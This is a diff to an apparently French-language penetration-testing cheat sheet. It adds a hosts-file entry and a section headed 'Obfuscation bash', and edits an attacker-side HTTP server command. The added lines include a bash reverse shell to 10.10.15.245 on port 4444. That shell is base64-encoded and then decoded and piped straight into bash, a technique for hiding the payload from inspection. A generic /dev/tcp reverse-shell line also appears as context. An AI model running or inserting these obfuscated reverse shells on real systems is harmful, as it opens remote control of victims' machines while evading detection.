@@ -5,6 +5,11 @@ draft: false
 showToc: true
 TocOpen: true
 ---
+## Utile
+
+```bash
+sudo echo "TARGET_IP TARGET_DOM" >> /etc/hosts
+```
 
 ## Reverse Shells
 
@@ -17,6 +22,11 @@ nc -lvnp <PORT>
 bash
 ```bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+```
+Obfuscation bash
+```bash
+echo "bash -i >& /dev/tcp/10.10.15.245/4444 0>&1" | base64
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNDUvNDQ0NCAwPiYxCg== | base64 -d | bash
 ```
 python
 ```bash
@@ -51,7 +61,7 @@ pspy (monitoring process) : https://github.com/DominicBreuker/pspy
 
 ### Serveur (Attaquant)
 ```bash
-python3 -m http.server 80
+sudo python3 -m http.server 80
 ```
 
 ### Téléchargement (Victime)
